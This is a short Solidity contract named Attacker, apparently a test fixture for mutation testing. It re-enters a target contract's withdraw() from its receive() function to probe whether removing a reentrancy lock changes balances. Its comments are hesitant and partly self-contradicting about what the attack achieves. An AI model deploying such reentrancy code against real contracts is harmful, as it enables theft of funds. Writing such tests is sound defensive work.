// Minimal attacker that reenters during withdraw
contract Attacker {
    C immutable target;
    address depositor;
    address victimToTouch;
    bool entered;

    constructor(C _target, address _victimToTouch) {
        target = _target;
        victimToTouch = _victimToTouch;
    }

    function setDepositor(address d) external { depositor = d; }

    // initiate the withdrawal as attacker: attacker must have a nonzero balance in target for withdraw to act
    // To ensure attacker has a balance, we first deposit from attacker into target, then call withdraw which will trigger reentrancy
    function attack() external payable {
        // deposit a small amount from this contract
        (bool ok,) = address(target).call{value: 0.1 ether}('');
        require(ok);
        // now call withdraw — during the withdraw, this contract's receive() will be invoked and will try to manipulate victim's balance by sending ether to target's fallback
        target.withdraw();
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            // during reentrancy, call fallback with value to attempt to modify balances of victimToTouch
            // send ether to the target so its fallback attributes value to msg.sender (which will be this contract)
            // We try to call target.fallback by performing an external call with value and using victimToTouch as the tx.origin? 
            // But we cannot force target to attribute value to victimToTouch directly; however, the mutant without lock allows reentrant sequence
            // that could cause other storage writes — to simulate an adversarial external interaction we call target with value which will add to this contract's balance in target
            // then attempt to call withdraw on behalf of this contract which can reorder balances in the mutant scenario
            (bool ok,) = address(target).call{value: 0.05 ether}('');
            // ignore ok
            if (ok) {
                // attempt another withdraw to cause more reentrant behavior
                // wrap in try/catch to continue
                try target.withdraw() {
                } catch {
                }
            }
        }
    }
}

